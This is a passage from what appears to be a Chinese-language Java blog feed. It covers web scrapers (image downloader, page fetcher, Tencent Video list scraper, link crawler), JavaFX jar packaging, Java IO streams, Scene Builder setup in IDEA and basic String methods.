给定cssQuery对象     * @param @param cssQuery HTML中的CSS(或者 JQuery)选择器语法，更多详细用法见Jsoup介绍 &lt; a     *        href=&quot;https://jsoup.org/apidocs/org/jsoup/select/Selector.html&quot;     *        &gt;&lt;/a&gt;     * @param @return List     * @throws     *     */    public List&lt;String&gt; getURLs(String cssQuery) {        List&lt;String&gt; urls = null;        Document doc;        Elements imgElements ;        if (!isURL(URL)) {            return null;        }        if(StringUtil.isBlank(cssQuery)){            cssQuery=&quot;img&quot;;        }        try {            doc = Jsoup.connect(URL).get();        } catch (IOException e) {            e.printStackTrace();            return null;        }        if(doc==null)return null;        imgElements = doc.select(cssQuery);        urls = new ArrayList&lt;String&gt;();        for (Object eleObj : imgElements) {            //&quot;(https?|ftp|http)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]&quot;            Pattern pattern = Pattern.compile(&quot;(https?|http)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]&quot;);            Matcher matcher = pattern.matcher(eleObj.toString());            if (matcher.find()) {                String url = matcher.group();                urls.add(url);            }        }        imgNumbs = imgElements.size();        return urls;    }    /**     *     * @Title: createImgURLTxt     * @Description:     * @param @param cssQuery：默认使用img HTML中的CSS(或者 JQuery)选择器语法，更多详细用法见Jsoup介绍 &lt;     *        a href=&quot;https://jsoup.org/apidocs/org/jsoup/select/Selector.html&quot;&gt;     *        &lt;/a&gt;     * @throws     */    public String createImgURLTxt(String cssQuery) {        long start = System.currentTimeMillis();        List&lt;String&gt; urls;        urls = getURLs(cssQuery);        BufferedWriter os = null;        File urlsFiles = new File(&quot;D:\\work\\imgURLs.txt&quot;);        if(urlsFiles.exists()){            try {                urlsFiles.createNewFile();            } catch (IOException e) {                e.printStackTrace();            }        }        try {            os = new BufferedWriter(new FileWriter(urlsFiles));            if(urls==null)return null;            for (int i = 0; i &lt; urls.size(); i++) {                os.write(urls.get(i) + &quot;\n&quot;);            }            String result = &quot;执行完毕,生成imgURLs.txt,耗时&quot;                    + (System.currentTimeMillis() - start) / 1000 + &quot;s&quot;;            System.out.println(result);            return result;        } catch (IOException e) {            e.printStackTrace();        } finally {            try {                if (os != null)                    os.close();            } catch (IOException e) {                e.printStackTrace();            }        }        return null;    }    /**     *     * @Title: createImgs     * @Description:     * @param @param cssQuery     * @param @throws IOException     * @throws     */    public void createImgs(String cssQuery) throws IOException {        long startTime = System.currentTimeMillis();        downloadMsg.add(&quot;Your images is downloading &quot;);        BufferedReader br = null;        OutputStream out = null;        InputStream in = null;        ArrayList&lt;String&gt; imgList = null;        HttpURLConnection con = null;        String url;             //待下载文件url        int fileSize = 0;       //单个文件大小        int totalFileNum=0;     //总文件数        int downLoadFileNum=0;  //已下载文件        long totalTime=0;       //总耗时/s        long singleTime=0;      //单个文件耗时/ms        br = new BufferedReader(new FileReader(imgUrlTxt));        imgList = new ArrayList&lt;String&gt;();        while ((url = br.readLine()) != null) {            imgList.add(url);        }        downLoadFileNum=totalFileNum= imgList.size();        downloadMsg.add(&quot;总文件数&quot;+(totalFileNum));        for (String listUrl : imgList) {            startTime = System.currentTimeMillis();            String fileName = listUrl.substring(listUrl.lastIndexOf(&#39;/&#39;) + 1);// 截取文件名            URL imgUrl = new URL(listUrl.trim());            if (con != null)                con.disconnect();            con = (HttpURLConnection) imgUrl.openConnection();            con.setRequestMethod(&quot;GET&quot;);            con.setDoInput(true);            con.setConnectTimeout(1000 * 30);            con.setReadTimeout(1000 * 30);            fileSize = con.getContentLength();            con.connect();            try {                in = con.getInputStream();                File file = new File(&quot;D:\\work\\img&quot; + File.separator, fileName);                if (!file.exists()) {                    file.getParentFile().mkdirs();                    file.createNewFile();                }                out = new BufferedOutputStream(new FileOutputStream(file));                int len = 0;                byte[] buff = new byte[1024 * 1024];                while ((len = new BufferedInputStream(in).read(buff)) != -1) {                    out.write(buff, 0, len);                }                out.flush();                downLoadFileNum--;            } catch (Exception e) {                e.printStackTrace();            } finally {                if (br != null)                    try {                        br.close();                    } catch (IOException e) {                        e.printStackTrace();                    }                if (in != null)                    try {                        in.close();                    } catch (IOException e) {                        e.printStackTrace();                    }                if (out != null)                    try {                        out.close();                    } catch (IOException e) {                        e.printStackTrace();                    }                singleTime=System.currentTimeMillis() - startTime;                totalTime+=singleTime;                downloadMsg.add(&quot;文件名&quot; + fileName + &quot;  文件大小&quot; + fileSize                        +&quot;  未下载文件数&quot;+(downLoadFileNum)                        +&quot;  下载耗时&quot;+ singleTime + &quot;ms&quot; );                System.out.println(downloadMsg.get(downloadMsg.size()-1));            }        }        downloadMsg.add(&quot;总耗时&quot;+totalTime/1000+&quot;s&quot;);    }    /**     * @throws IOException     *     * @Title: main     * @Description: test     * @param @param args     * @throws     */    public static void main(String[] args) throws IOException {        ImgTool img = ImgTool.getInstance();        img.createImgURLTxt(&quot;img&quot;);        List&lt;String&gt; urls = img.getURLs(&quot;img&quot;);        for (Object str : urls) {            System.out.println(str.toString());        }        img.createImgs(null);    }}</code></pre><h3 id="获取HTML"><a href="#获取HTML" class="headerlink" title="获取HTML"></a>获取HTML</h3><pre><code>import org.apache.http.HttpEntity;import org.apache.http.client.methods.CloseableHttpResponse;import org.apache.http.client.methods.HttpGet;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClientBuilder;import org.apache.http.impl.client.HttpClients;import org.apache.http.util.EntityUtils;import java.io.File;import java.io.FileWriter;import java.io.IOException;public class GetPage {    public static String getPage(String url){        File file =new File(&quot;D:\\work&quot;);        FileWriter fwriter=null;        HttpClientBuilder httpClientBuilder= HttpClients.custom();        CloseableHttpClient client =httpClientBuilder.build();        HttpGet request=new HttpGet(url);        String content=null;        String IoMessage=&quot;&quot;;        try {            CloseableHttpResponse response = client.execute(request);            HttpEntity entity=response.getEntity();            content = EntityUtils.toString(entity);        } catch (IOException e) {            e.printStackTrace();        }        try {            if(!file.exists()){                file.mkdirs(); //创建目录            }            // true表示不覆盖原来的内容，而是加到文件的后面。若要覆盖原来的内容，直接省略这个参数就好            file=new File(file+&quot;\\&quot;+&quot;page&quot;+&quot;.txt&quot;); //若文件夹已经存在，不会重复创建和覆盖原有内容            fwriter = new FileWriter(file, true);            fwriter.write(content);        } catch (IOException ex) {            ex.printStackTrace();        } finally {            try {                fwriter.flush();                fwriter.close();                IoMessage=&quot;\n数据已抓取:内容写入至D:\\work\\page.txt\n&quot;;            } catch (IOException ex) {                ex.printStackTrace();            }        }        return IoMessage+content ;    }//    public static void main(String[] args) {////        System.out.println( getPage(&quot;https://study.163.com&quot;));//    }}</code></pre><h3 id="获取视频"><a href="#获取视频" class="headerlink" title="获取视频"></a>获取视频</h3><pre><code>import java.io.File;import java.io.FileWriter;import java.io.IOException;import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;import org.jsoup.Jsoup;import org.jsoup.nodes.Document;import org.jsoup.nodes.Element;import org.jsoup.select.Elements;public class TencentVideo {   static FileWriter fileWrite=null;    public static void getTencentVideoName(String url) {        List&lt;Map&lt;String,String&gt;&gt; resultList = new ArrayList&lt;Map&lt;String,String&gt;&gt;();        File file=new File(&quot;D:\\work&quot;);        if (!file.exists()){            file.mkdirs();        }        file=new File(file+File.separator+&quot;MoveMessage&quot;+&quot;.txt&quot;);        try {           fileWrite= new FileWriter(file, true);        } catch (IOException e) {            e.printStackTrace();        }        Document document = null;        int pageSize = 30;        int index = 1;        try {            for(int i = 0 ; i &lt; 167; i ++) {                String urlget =  url + (i*pageSize);                Thread.sleep(1000);                System.out.println(&quot;URL:&quot; + urlget.toString());                document = Jsoup.connect(urlget).userAgent(&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;)                        //加上cookie信息                        .cookie(&quot;auth&quot;, &quot;token&quot;)                        //设置超时                        .timeout(30000)                        //用get()方式请求网址，也可以post()方式                        .get();                Elements elements = document.select(&quot;li.list_item&quot;);                if(elements == null || &quot;&quot;.equals(elements.toString())) {                    break;                }                for (Element ele : elements) {                    Map&lt;String,String&gt; obj = new HashMap&lt;String,String&gt;();                    Elements name = ele.select(&quot;strong.figure_title&quot;);                    String nameStr = name.select(&quot;a&quot;).attr(&quot;title&quot;);                    String leader  = ele.select(&quot;div.figure_desc&quot;).text();                    String count  = ele.select(&quot;div.figure_count&quot;).text();                    String remark = ele.select(&quot;span.figure_info&quot;).text();                    String score = ele.select(&quot;div.figure_score&quot;).text();                    System.out.println(&quot;================== &quot; + index + &quot; =====================&quot;);                    System.out.println(&quot;名称：&quot; + nameStr.toString());                    System.out.println(&quot;主演：&quot; + leader.toString());                    System.out.println(&quot;评分：&quot; + score.toString());                    System.out.println(&quot;描述：&quot; + remark.toString());                    System.out.println(&quot;点播量：&quot; + count.toString());                    obj.put(&quot;name&quot;, nameStr);                    obj.put(&quot;lead&quot;, leader);                    obj.put(&quot;desc&quot;, remark);                    obj.put(&quot;score&quot;, score);                    obj.put(&quot;dianbo&quot;, count);                    resultList.add(obj);                    fileWrite.write(String.valueOf(obj)+&quot;\n&quot;);                    index ++;                }            }            //new ExportExcel().exportTencentExcle(resultList);        } catch (IOException e) {            e.printStackTrace();        }catch (Exception ae) {            ae.printStackTrace();        }finally {            try {                fileWrite.flush();                fileWrite.close();            } catch (IOException e) {                e.printStackTrace();            }        }    }    public static void main(String[] args) {        //电影        //getTencentVideoName(&quot;http://v.qq.com/x/list/movie?itype=-1&amp;offset=&quot;);        //电视剧//        getTencentVideoName(&quot;http://v.qq.com/x/list/tv?feature=-1&amp;offset=&quot;);        //动漫//        getTencentVideoName(&quot;http://v.qq.com/x/list/cartoon?itype=-1&amp;offset=&quot;);        //少儿//        getTencentVideoName(&quot;http://v.qq.com/x/list/child?iarea=-1&amp;offset=&quot;);        //综艺//        getTencentVideoName(&quot;http://v.qq.com/x/list/variety?exclusive=-1&amp;offset=&quot;);        //演唱会//        getTencentVideoName(&quot;http://v.qq.com/x/list/music?istate=2&amp;offset=&quot;);        //纪录片//        getTencentVideoName(&quot;http://v.qq.com/x/list/doco?itrailer=-1&amp;offset=&quot;);        //电影独播//        getTencentVideoName(&quot;https://v.qq.com/x/list/movie?characteristic=5&amp;offset=&quot;);        //电视剧独播        getTencentVideoName(&quot;https://v.qq.com/x/list/tv?feature=44&amp;offset=&quot;);    }}</code></pre><h3 id="获取站点所有连接"><a href="#获取站点所有连接" class="headerlink" title="获取站点所有连接"></a>获取站点所有连接</h3><pre><code>import java.io.*;import java.net.HttpURLConnection;import java.net.MalformedURLException;import java.net.URL;import java.util.LinkedHashMap;import java.util.Map;import java.util.regex.Matcher;import java.util.regex.Pattern;public class WebCrawlerDemo {    public static void main(String[] args) throws IOException {        WebCrawlerDemo webCrawlerDemo = new WebCrawlerDemo();        webCrawlerDemo.myPrint(&quot;https://v.qq.com&quot;);    }    public String myPrint(String baseUrl) throws IOException {        Map&lt;String, Boolean&gt; oldMap = new LinkedHashMap&lt;String, Boolean&gt;(); // 存储链接-是否被遍历        // 键值对        FileWriter fileWriter=null;        String oldLinkHost = &quot;&quot;;  //host        File file=new File(&quot;D:\\work&quot;);        if (!file.exists()){          file.mkdirs();        }        file=new File(file+File.separator+&quot;LinkUrl&quot;+&quot;.txt&quot;);         fileWriter=new FileWriter(file,true);        Pattern p = Pattern.compile(&quot;(https?://)?[^/\\s]*&quot;); //比如：http://www.zifangsky.cn        Matcher m = p.matcher(baseUrl);        if (m.find()) {            oldLinkHost = m.group();        }        oldMap.put(baseUrl, false);        try {            oldMap = crawlLinks(oldLinkHost, oldMap);        } catch (IOException e) {            e.printStackTrace();        }        StringBuffer stringBuffer=new StringBuffer();        for (Map.Entry&lt;String, Boolean&gt; mapping : oldMap.entrySet()) {            stringBuffer.append(&quot;链接：&quot; + mapping.getKey()+&quot;\n&quot;);            System.out.println(&quot;链接：&quot; + mapping.getKey());        }        fileWriter.write(stringBuffer.toString());        fileWriter.flush();        fileWriter.close();        return stringBuffer.toString();    }    /**     * 抓取一个网站所有可以抓取的网页链接，在思路上使用了广度优先算法     * 对未遍历过的新链接不断发起GET请求，一直到遍历完整个集合都没能发现新的链接     * 则表示不能发现新的链接了，任务结束     *     * @param oldLinkHost 域名，如：http://www.zifangsky.cn     * @param oldMap      待遍历的链接集合     * @return 返回所有抓取到的链接集合     */    private Map&lt;String, Boolean&gt; crawlLinks(String oldLinkHost,                                            Map&lt;String, Boolean&gt; oldMap) throws IOException {        Map&lt;String, Boolean&gt; newMap = new LinkedHashMap&lt;String, Boolean&gt;();        String oldLink = &quot;&quot;;        for (Map.Entry&lt;String, Boolean&gt; mapping : oldMap.entrySet()) {            System.out.println(&quot;link:&quot; + mapping.getKey() + &quot;--------check:&quot;                    + mapping.getValue());            // 如果没有被遍历过            if (!mapping.getValue()) {                oldLink = mapping.getKey();                // 发起GET请求                try {                    URL url = new URL(oldLink);                    HttpURLConnection connection = (HttpURLConnection) url                            .openConnection();                    connection.setRequestMethod(&quot;GET&quot;);                    connection.setConnectTimeout(2000);                    connection.setReadTimeout(2000);                    if (connection.getResponseCode() == 200) {                        InputStream inputStream = connection.getInputStream();                        BufferedReader reader = new BufferedReader(                                new InputStreamReader(inputStream, &quot;UTF-8&quot;));                        String line = &quot;&quot;;                        Pattern pattern = Pattern                                .compile(&quot;&lt;a.*?href=[\&quot;&#39;]?((https?://)?/?[^\&quot;&#39;]+)[\&quot;&#39;]?.*?&gt;(.+)&lt;/a&gt;&quot;);                        Matcher matcher = null;                        while ((line = reader.readLine()) != null) {                            matcher = pattern.matcher(line);                            if (matcher.find()) {                                String newLink = matcher.group(1).trim(); // 链接                                // String title = matcher.group(3).trim(); //标题                                // 判断获取到的链接是否以http开头                                if (!newLink.startsWith(&quot;http&quot;)) {                                    if (newLink.startsWith(&quot;/&quot;))                                        newLink = oldLinkHost + newLink;                                    else                                        newLink = oldLinkHost + &quot;/&quot; + newLink;                                }                                //去除链接末尾的 /                                if (newLink.endsWith(&quot;/&quot;))                                    newLink = newLink.substring(0, newLink.length() - 1);                                //去重，并且丢弃其他网站的链接                                if (!oldMap.containsKey(newLink)                                        &amp;&amp; !newMap.containsKey(newLink)                                        &amp;&amp; newLink.startsWith(oldLinkHost)) {                                    // System.out.println(&quot;temp2: &quot; + newLink);                                    newMap.put(newLink, false);                                }                            }                        }                    }                } catch (MalformedURLException e) {                    e.printStackTrace();                } catch (IOException e) {                    e.printStackTrace();                }                try {                    Thread.sleep(1000);                } catch (InterruptedException e) {                    e.printStackTrace();                }                oldMap.replace(oldLink, false, true);            }        }        //有新链接，继续遍历        if (!newMap.isEmpty()) {            oldMap.putAll(newMap);            oldMap.putAll(crawlLinks(oldLinkHost, oldMap));  //由于Map的特性，不会导致出现重复的键值对        }        return oldMap;    }}</code></pre><h3 id="最终截图"><a href="#最终截图" class="headerlink" title="最终截图"></a>最终截图</h3><p><img src="http://img.ahdy.top/2020-03-12%20130421.png" alt></p><h3 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h3><p>网盘当中包含了，我打包好的运行程序，和项目源码。<br><a href="https://share.weiyun.com/5wpvOl0" target="_blank" rel="noopener">腾讯微云</a></p><h3 id="FX程序打包"><a href="#FX程序打包" class="headerlink" title="FX程序打包"></a>FX程序打包</h3><p>打包有什么用呢？假如你的朋友不会编程那么他也想使用你开发的程序那么该怎么办，他的电脑上也没有下载jdk，这时候我们项目打包，经过打包发布的程序在每台电脑上都能够运行起来。</p><h4 id="以IDEA为例子"><a href="#以IDEA为例子" class="headerlink" title="以IDEA为例子"></a>以IDEA为例子</h4><p><a href="https://blog.csdn.net/njxiaoxiao79/article/details/85679992?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">详情参考此处</a></p><h4 id="启动jar程序"><a href="#启动jar程序" class="headerlink" title="启动jar程序"></a>启动jar程序</h4><p><img src="http://img.ahdy.top/2020-03-12_155414.png" alt="随便创建一个文件夹，文件夹内包含这三样东西"><br>1.你需要将jdk子目录当中的jre文件夹。也就是Java程序运行时需要的环境拿过来。</p><p>2.再把打包好的jar包放进来</p><p>3.最后一步，也是关键的一步，创建批处理命令(.bat)文件，使用工具编辑该文件，在文件内写入脚本</p><pre><code>start  jre\bin\java.exe  -jar  Web_Spider.jar</code></pre><p>注意:最后等待.jar文件以你所打包的报名为准，代码中的jar名不是固定的。</p><p>其中 java.exe为带有doc命令的窗口程序，如果不需要则可以修改为Javaw.exe。</p><h3 id="关于打包成-exe可执行文件问题"><a href="#关于打包成-exe可执行文件问题" class="headerlink" title="关于打包成.exe可执行文件问题"></a>关于打包成.exe可执行文件问题</h3><p>fx程序可以打包成.exe执行程序，详情参考网络教程。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java IO流</title>
      <link href="/2020/02/27/java/javaio/"/>
      <url>/2020/02/27/java/javaio/</url>
      
        <content type="html"><![CDATA[<h3 id="java-IO流"><a href="#java-IO流" class="headerlink" title="java IO流"></a>java IO流</h3><p>数据是怎么存储到磁盘当中的？<br>内存起到了什么作用？</p><pre><code>内存和内存之间，内存和网络的其它内存，内存和硬盘文件，内存和数据库文件之间的数据是通过流进行传递的。以数据的流向分类，能够读取字节的序列的API对象成为输入流（InputStream），能够写入字节序列的成为输出流（OutputStream）。字节是计算机数据的存储的形式，任何数据都可以使用字节流进行读写。读取来源和写入目标可以是文件，内存，网络，数据库和文件。InputStream和OutputStream两个抽象类构成了读写IO体系的框架基础。字节流虽然可以操作任何的数据形式，但是对于占用多个字节的字符却不是很方便。  需要知道，所以在JAVA中有专门提供了对于字符流的两个抽象类Reader和Writer</code></pre><p>  分类：</p><p>  IO流按照操作对象：字节流和字符流</p><p>  按照流的方向分：输入流和输出流</p><p>  这些流就像流动的血液，在内存和数据存储媒介间来回的流动<br><img src="http://img.ahdy.top/156766362.png" alt><br><img src="http://img.ahdy.top/6359987487114764407472214.png" alt></p><h4 id="获取项目路径"><a href="#获取项目路径" class="headerlink" title="获取项目路径"></a>获取项目路径</h4><p>String path=FileReader.class.getResource(“/“).getFile();</p><p>//获取当前项目运行时所在根目录</p><p>System.out.println(path);</p><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><pre><code>InputStream f = new FileInputStream(&quot;C:/java/hello&quot;);File f = new File(&quot;C:/java/hello&quot;);InputStream out = new FileInputStream(f);</code></pre><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><pre><code>    import java.io.*;public class fileStreamTest {    public static void main(String args[]) {        try {            byte bWrite[] = { 11, 21, 3, 40, 5 };            OutputStream os = new FileOutputStream(&quot;test.txt&quot;);            for (int x = 0; x &lt; bWrite.length; x++) {                os.write(bWrite[x]); // writes the bytes            }            os.close();            InputStream is = new FileInputStream(&quot;test.txt&quot;);            int size = is.available();            for (int i = 0; i &lt; size; i++) {                System.out.print((char) is.read() + &quot;  &quot;);            }            is.close();        } catch (IOException e) {            System.out.print(&quot;Exception&quot;);        }    }}</code></pre><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><pre><code>OutputStream f = new FileOutputStream(&quot;C:/java/hello&quot;);File f = new File(&quot;C:/java/hello&quot;);OutputStream f = new FileOutputStream(f);</code></pre><h4 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h4><pre><code>import java.io.*;public class fileStreamTest2 {    public static void main(String[] args) throws IOException {        File f = new File(&quot;a.txt&quot;);        FileOutputStream fop = new FileOutputStream(f);        // 构建FileOutputStream对象,文件不存在会自动新建        OutputStreamWriter writer = new OutputStreamWriter(fop, &quot;UTF-8&quot;);        // 构建OutputStreamWriter对象,参数可以指定编码,默认为操作系统默认编码,windows上是gbk        writer.append(&quot;中文输入&quot;);        // 写入到缓冲区        writer.append(&quot;\r\n&quot;);        // 换行        writer.append(&quot;English&quot;);        // 刷新缓存冲,写入到文件,如果下面已经没有写入的内容了,直接close也会写入        writer.close();        // 关闭写入流,同时会把缓冲区内容写入文件,所以上面的注释掉        fop.close();        // 关闭输出流,释放系统资源        FileInputStream fip = new FileInputStream(f);        // 构建FileInputStream对象        InputStreamReader reader = new InputStreamReader(fip, &quot;UTF-8&quot;);        // 构建InputStreamReader对象,编码与写入相同        StringBuffer sb = new StringBuffer();        while (reader.ready()) {            sb.append((char) reader.read());            // 转成char加到StringBuffer对象中        }        System.out.println(sb.toString());        reader.close();        // 关闭读取流        fip.close();        // 关闭输入流,释放系统资源    }}</code></pre><h3 id="File类"><a href="#File类" class="headerlink" title="File类"></a>File类</h3><p>File可以让我们创建一个文件夹，这个对象便利了我们对文件的操作。  </p><h4 id="创建文件夹及路径"><a href="#创建文件夹及路径" class="headerlink" title="创建文件夹及路径"></a>创建文件夹及路径</h4><pre><code>public static void main(String[] args) {    String path =&quot;F:\\testcode\\Index&quot;; //所创建文件目录    File f = new File(path);     if(!f.exists()){        f.mkdirs(); //创建目录    }    String fileName = &quot;abc.txt&quot;; //文件名及类型    File file = new File(path,fileName);    if(!file.exists()){ //surround with try/catch        try {             file.createNewFile();        } catch (IOException e) {            // TODO Auto-generated catch block            e.printStackTrace();        }    }}</code></pre><h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><pre><code>    方式一    String str=&quot;hello world!&quot;;        FileWriter writer;        try {            writer = new FileWriter(&quot;E:/token.txt&quot;);            write.write(&quot;&quot;);//清空原文件内容            writer.write(str);            writer.flush();            writer.close();        } catch (IOException e) {            e.printStackTrace();        }    方式二    File txt=new File(&quot;E:/log1.txt&quot;);         if(!txt.exists()){               txt.createNewFile();          }           byte bytes[]=new byte[512];            bytes=str.getBytes();           int b=bytes.length;   //是字节的长度，不是字符串的长度         FileOutputStream fos=new FileOutputStream(txt);          fos.write(bytes,0,b);          fos.write(bytes);         fos.close;    方式三    FileOutputStream fos = new FileOutputStream(&quot;E:/log.txt&quot;,true);    //true表示在文件末尾追加      fos.write(log.getBytes());      fos.close();</code></pre><h4 id="路径创建与写入联合使用"><a href="#路径创建与写入联合使用" class="headerlink" title="路径创建与写入联合使用"></a>路径创建与写入联合使用</h4><pre><code>      String result=extractText(doc);    FileWriter fileWriter=null;    File file =new File(&quot;D:\\work&quot;);    if (!file.exists()){        file.mkdirs();//创建    }    file=new File(file+&quot;\\&quot;+&quot;txt&quot;+&quot;.txt&quot;);    try {        fileWriter = new FileWriter(file, true);        fileWriter.write(result+&quot;\n&quot;);    } catch (IOException e) {        e.printStackTrace();    }finally {        try {            fileWriter.flush();            fileWriter.close();        }catch (Exception e){            e.printStackTrace();        }    }</code></pre><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><p>FileReader类从InputStreamReader类继承而来。该类按字符读取流中数据。可以通过以下几种构造方法创建需要的对象。</p><p>在给定从中读取数据的 File 的情况下创建一个新 FileReader。</p><p>FileReader(File file)<br>在给定从中读取数据的 FileDescriptor 的情况下创建一个新 FileReader。</p><p>FileReader(FileDescriptor fd)<br>在给定从中读取数据的文件名的情况下创建一个新 FileReader。</p><p>FileReader(String fileName) </p><pre><code>import java.io.*;public class FileRead {    public static void main(String args[]) throws IOException {        File file = new File(&quot;Hello1.txt&quot;);        // 创建文件        file.createNewFile();        // creates a FileWriter Object        FileWriter writer = new FileWriter(file);        // 向文件写入内容        writer.write(&quot;This\n is\n an\n example\n&quot;);        writer.flush();        writer.close();        // 创建 FileReader 对象        FileReader fr = new FileReader(file);        char[] a = new char[50];        fr.read(a); // 读取数组中的内容        for (char c : a)            System.out.print(c); // 一个一个打印字符        fr.close();    }}</code></pre><h3 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h3><p>FileWriter 类从 OutputStreamWriter 类继承而来。该类按字符向流中写入数据。可以通过以下几种构造方法创建需要的对象。</p><p>在给出 File 对象的情况下构造一个 FileWriter 对象。</p><p>FileWriter(File file)<br>在给出 File 对象的情况下构造一个 FileWriter 对象。</p><p> FileWriter(File file, boolean append)<br>file：要写入数据的 File 对象。</p><p>append：如果 append 参数为 true，则将字节写入文件末尾处，相当于追加信息。如果 append 参数为 false, 则写入文件开始处。</p><pre><code>import java.io.*;public class FileRead {    public static void main(String args[]) throws IOException {        File file = new File(&quot;Hello1.txt&quot;);        // 创建文件        file.createNewFile();        // creates a FileWriter Object        FileWriter writer = new FileWriter(file);        // 向文件写入内容        writer.write(&quot;This\n is\n an\n example\n&quot;);        writer.flush();        writer.close();        // 创建 FileReader 对象        FileReader fr = new FileReader(file);        char[] a = new char[50];        fr.read(a); // 从数组中读取内容        for (char c : a)            System.out.print(c); // 一个个打印字符        fr.close();    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> IO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> IO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA集成scene builder</title>
      <link href="/2020/02/26/idea/sencebuilder/"/>
      <url>/2020/02/26/idea/sencebuilder/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是JavaFX-Scene-Builder"><a href="#什么是JavaFX-Scene-Builder" class="headerlink" title="什么是JavaFX Scene Builder?"></a>什么是JavaFX Scene Builder?</h3><p>JavaFX Scene Builder是一种可视布局工具，允许用户快速设计JavaFX应用程序用户界面，而无需编码。用户可以将UI组件拖放到工作区，修改其属性，应用样式表，并且它们正在创建的布局的FXML代码将在后台自动生成。它的结果是一个FXML文件，然后可以通过绑定到应用程序的逻辑与Java项目组合。</p><p>类似于C#拖拽式开发GUI界面</p><h3 id="下载Scene-Builder"><a href="#下载Scene-Builder" class="headerlink" title="下载Scene Builder"></a>下载Scene Builder</h3><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/javafxscenebuilder-1x-archive-2199384.html" target="_blank" rel="noopener">官方地址</a><br><img src="http://img.ahdy.top/2020-02-29_053440.png" alt="选择最新版本-如果你别的系统就选你用的系统版本"></p><p>这期间会让你登录Oracle账号，注册账号才能下载它的产品，<br>下载好后桌面会出现手指样图标。    </p><h3 id="IDEA引用sencebuilder插件"><a href="#IDEA引用sencebuilder插件" class="headerlink" title="IDEA引用sencebuilder插件"></a>IDEA引用sencebuilder插件</h3><p>1.打开settings，选择plugins，启用FX插件，打勾即可<br><img src="http://img.ahdy.top/2020-02-29_053946.png" alt><br>2.在settings中找到，Languages and Framework，选择FX,将sencebuilder的启动地址(.exe文件)设置进去。<br><img src="http://img.ahdy.top/2020-02-29_054125.png" alt></p><h3 id="新建FX项目，调用插件"><a href="#新建FX项目，调用插件" class="headerlink" title="新建FX项目，调用插件"></a>新建FX项目，调用插件</h3><p><img src="http://img.ahdy.top/2020-02-29_054601.png" alt="右键FXML文件"><br>在此调用插件，打开工具，配置完成。</p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FX </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java算法-API</title>
      <link href="/2020/02/25/java/javamath/"/>
      <url>/2020/02/25/java/javamath/</url>
      
        <content type="html"><![CDATA[<h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><p>compareTo是String类自带的方法，Integer也适用，比较两个字符串，并返回字符串中第一个字母ASCII的差值，当碰到不一样的字符串的时候就会立刻返回当前Ascll码差值。</p><pre><code>public static void main(String[] args) throws Exception {    String string =&quot;123&quot;;    String string2 =&quot;124&quot;;    Object object=string;    System.out.println(string.compareTo(object.toString()));    System.out.println(string.compareToIgnoreCase(string2));//忽略大小写    System.out.println(string.compareTo(string2));}</code></pre><h3 id="字符串出现的位置"><a href="#字符串出现的位置" class="headerlink" title="字符串出现的位置"></a>字符串出现的位置</h3><pre><code>   String string=&quot;4545465454654123&quot;;   int intenger=string.lastIndexOf(&quot;123&quot;);   int intenger=string.lastIndexOf(123);    //同样使用于数字，若找不到则会返回-1   System.out.println(intenger);    //打印结果为:13</code></pre><h3 id="删除字符串当中的字符"><a href="#删除字符串当中的字符" class="headerlink" title="删除字符串当中的字符"></a>删除字符串当中的字符</h3><p>我写了一个简单的方法，基于前面的基础，可以删除掉一个字符串内单个字符，或者是一个字符串。str.substring可以截取一段字符串。</p><pre><code>public static void main(String[] args) throws Exception {   String string=&quot;4545465454654123&quot;;   String string2=&quot;123&quot;;   int intenger=string.lastIndexOf(string2);   int strlength=string2.length();   System.out.println(intenger);   System.out.println(ss(string,intenger,strlength));}public static String ss(String str, int number,int number2){    return str.substring(0,number)+str.substring(number+number2);}输出结果:134545465454654</code></pre><h3 id="替换字串当中的字符"><a href="#替换字串当中的字符" class="headerlink" title="替换字串当中的字符"></a>替换字串当中的字符</h3><pre><code>public static void main(String[] args) throws Exception {    String str=&quot;hello hello&quot;;    String string=str.replace(&quot;l&quot;,&quot;0&quot;);//替换掉字符串当中所有的L   //String string=str.replaceFirst(&quot;l&quot;,&quot;0&quot;); 替换字符串当出现的第一个字符    //String string=str.replaceAll(&quot;l&quot;,&quot;0&quot;); 替换字符串当中所有字符，类似replace方法    System.out.println(string);}</code></pre><h3 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h3><p>reverse() 可将字符串反转：</p><pre><code>  public static void main(String[] args) throws Exception {    String str=&quot;hello hello&quot;;    String str2=new 